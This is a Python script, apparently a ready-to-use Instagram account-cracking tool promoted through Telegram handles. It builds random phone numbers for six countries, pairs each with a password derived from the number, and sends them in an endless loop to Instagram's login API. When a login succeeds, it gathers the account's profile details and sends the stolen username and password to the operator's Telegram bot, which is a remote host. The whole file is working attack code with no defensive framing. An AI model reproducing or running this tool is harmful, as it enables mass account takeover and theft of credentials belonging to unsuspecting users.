import webbrowser
webbrowser.open('https://t.me/j_b_i')
import webbrowser, random, requests, user_agent, json
from secrets import token_hex
import secrets, os, sys, uuid
from uuid import uuid4
from time import sleep
import webbrowser, pyfiglet, time
aa = 0
zz = 0
E = '\x1b[1;31m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
Z = '\x1b[1;31m'
X = '\x1b[1;33m'
Z1 = '\x1b[2;31m'
F = '\x1b[2;32m'
A = '\x1b[2;39m'
C = '\x1b[2;35m'
B = '\x1b[2;36m'
Y = '\x1b[1;34m'
Z2 = '\x1b[1;31m'
X = '\x1b[1;33m'
Z1 = '\x1b[2;31m'
F = '\x1b[2;32m'
A = '\x1b[2;39m'
C = '\x1b[2;35m'
B = '\x1b[2;36m'
Y = '\x1b[1;34m'
E1 = '\x1b[1;31m'
G1 = '\x1b[1;32m'
S1 = '\x1b[1;33m'
Z = '\x1b[2;31m'
G2 = '\x1b[1;32m'
E = '\x1b[1;31m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
import time
timee = time.asctime()
print('   ')
print('   ')

def a(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        sleep(0.00025745123279532627)


import time
timee = time.asctime()
abs = pyfiglet.figlet_format(' Ghassan ')
print(' ')

def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0002)


j(X + abs)
print(B + '           ⌯ By - @VIVVVVV ♡.\n \n               ⌯ CH - @vrrvrvr ♡.')
print('  ')
j(Y + '. — — — — —  — — — — — .')
ask = j(F + '\n⌯ 1 - Check in iran ♡   \n\n⌯ 2 - Check in iRaQ ♡   \n\n⌯ 3 - Check in Egypt ♡   \n\n⌯ 4 - Check in Saudi Arabia ♡   \n\n⌯ 5 - Check in Turkey ♡   \n\n⌯ 6 - Check in Morocco ♡   \n')
j(Y + '. — — — — —  — — — — — .')
sleep(0.1)
print('  ')
token = input('' + B + '(' + A + '!' + X + ')' + B + '  ⌯ Enter Token  :  ' + F)
print('  ')
ID = input('' + B + '(' + A + '!' + X + ')' + B + '  ⌯ Enter iD :  ' + F)
print(' ')
Abs = input('' + B + '(' + A + '!' + X + ')' + B + '  ⌯ Chose  :  ' + F)
print('  ')
import time
t = time.localtime()
current_time = time.strftime('%H:%M:%S', t)
print('  ')
start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ 𝗟𝗢𝗗𝗜𝗡𝗚...🐆🔥 .").json()
id_msg = start_msg['result']['message_id']

def code_qqqqbqq(userQ, password):
    cookie = secrets.token_hex(8) * 2
    head = {'HOST':'www.instagram.com',  'KeepAlive':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
     'Cookie':'cookie', 
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'missing', 
     'X-CSRFToken':'missing', 
     'Accept-Language':'en-US,en;q=0.9'}
    url_id = f"https://www.instagram.com/{userQ}/?__a=1"
    req_id = requests.get(url_id, headers=head).json()
    name = str(req_id['graphql']['user']['full_name'])
    id = str(req_id['graphql']['user']['id'])
    followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
    following = str(req_id['graphql']['user']['edge_follow']['count'])
    isp = str(req_id['graphql']['user']['is_private'])
    idd = str(req_id['graphql']['user']['id'])
    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
    ree = re.json()
    dat = ree['data']
    Aabs = f"\n\n𝐍𝐄𝐖 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐅𝐫𝐎𝐦 : ˹𝐆𝐇𝐀𝐒𝐒𝐀𝐍 ˼  ✓\n. — — — — —  — — — — — .\n⌯ 𝗡𝗔𝗠𝗘 : {name} \n⌯ 𝗨𝗦𝗘𝗥 : {userQ} \n⌯ 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 : {password} \n⌯ 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗦 : {followes} \n⌯ 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚 : {following} \n⌯ 𝗗𝗔𝗧𝗘 : {dat} \n. — — — — —  — — — — — \n • By : @VIVVVVV \n• CH : @VRRVRVR\n "
    tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={Aabs}"
    i = requests.post(tlg)
    print(G + Aabs)


url = 'https://i.instagram.com/api/v1/accounts/login/'
headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Y6 2019 pream; angler; angler; en_US)', 
 'Accept':'*/*', 
 'Cookie':'missing', 
 'Accept-Encoding':'gzip, deflate', 
 'Accept-Language':'en-US', 
 'X-IG-Capabilities':'3brTvw==', 
 'X-IG-Connection-Type':'WIFI', 
 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
 'Host':'i.instagram.com'}
sleep(1)
user = '1234567890'
while True:
    if Abs == '1':
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '+98912' + us
        password = '0912' + us
    if Abs == '2':
        os.system('clear')
        print(Y + '\n⌯  0780 - 0770 - 0750 ♡ \n')
        Abs = input('' + B + '(' + A + '!' + X + ')' + B + '  ⌯ Chose  :  ' + F)
        print(' ')
    if Abs == '0780':
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '+964780' + us
        password = '0780' + us
    if Abs == '0770':
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '+964770' + us
        password = '0770' + us
    if Abs == '0750':
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '+964750' + us
        password = '0750' + us
    if Abs == '3':
        os.system('clear')
        print(Y + '\n⌯  012 - 010 ♡ \n')
        Abs = input('' + B + '(' + A + '!' + X + ')' + B + '  ⌯ Chose  :  ' + F)
        print(' ')
    if Abs == '012':
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+2012' + us
        password = '012' + us
    if Abs == '010':
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+2010' + us
        password = '010' + us
    if Abs == '4':
        os.system('clear')
        print(Y + '\n⌯  050 - 005 - 054 ♡ \n')
        Abs = input('' + B + '(' + A + '!' + X + ')' + B + '  ⌯ Chose  :  ' + F)
        print(' ')
    if Abs == '050':
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+96650' + us
        password = '050' + us
    if Abs == '005':
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+96605' + us
        password = '005' + us
    if Abs == '054':
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+96654' + us
        password = '054' + us
    if Abs == '5':
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '+90531' + us
        password = '0531' + us
    if Abs == '6':
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+2126' + us
        password = '06' + us
    uid = str(uuid4())
    data = {'uuid':uid, 
     'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
    req = requests.post(url, headers=headers, data=data)
    if 'logged_in_user' in req.json():
        zz += 1
        userQ = req.json()['logged_in_user']['username']
        code_qqqqbqq(userQ, password)
    elif '"message":"challenge_required","challenge"' in req.json():
        print(S + 'username : ' + username + ': password : ' + password)
    else:
        requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=⌯ 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐆𝐇𝐀𝐒𝐒𝐀𝐍 𝐓𝐎𝐎𝐋 🦉🔥 .\n . — — — — —  — — — — — . \n ⌯ 𝐇𝐈𝐓 [{zz}]\n                         >> {username} <<\n⌯ 𝗕𝗔𝗗 [{aa}] \n. — — — — —  — — — — — .\n⌯ By : @VIVVVVV - CH : @VRRVRVR .")
        print(E + 'username : ' + username + ': password : ' + password)
        aa += 1
